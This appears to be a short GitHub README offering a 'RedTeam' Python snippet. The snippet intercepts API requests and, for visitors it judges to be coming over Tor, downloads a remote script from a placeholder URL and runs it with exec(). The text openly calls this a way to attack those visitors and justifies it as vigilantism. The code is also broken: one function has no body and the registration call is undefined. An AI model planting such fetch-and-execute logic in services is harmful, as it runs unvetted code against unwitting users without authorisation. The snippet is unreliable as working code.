# Feuerteufel Logic
###### RedTeam Script Examples (EDU) by Volkan Sah - simple codings for 'Offensive Security' (updated 5/2023)

A creative small Python script that intercepts API requests and, when accessed through the Tor network, loads and runs an external script from a specified URL to Fuck them!
However, keep in mind that this is a highly risky and potentially illegal activity. Use at your own risk and only against crime and child abuse!
##Sorry cant explane all or you know what can be!

## WARNING: READ CAREFULLY! !!! DANGER !!!
This Black Python script example is intended for use by security professionals and developers only. It is not intended for malicious purposes, and I cannot be held responsible for any misuse of this code. If you use this tool for illegal or unethical purposes, you alone will be held responsible for any consequences that may arise, including legal and ethical issues.

Please see [SherlocksHome](https://github.com/VolkanSah/SherlocksHome/) to custumize your logic

```python
import requests

def intercept_api_requests(request):
    if check_if_accessed_over_tor(request):
        external_script_url = "https://example.com/external_script.py"
        response = requests.get(external_script_url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print("Failed to load the external script.")

def check_if_accessed_over_tor(request):
    # Implement your logic to detect if the request is coming from the Tor network
    # This might involve inspecting the request headers or analyzing network traffic
    # Be aware that attempting to bypass security measures is likely illegal and unethical

# Register the interceptor function to intercept API requests
register_interceptor(intercept_api_requests)
```
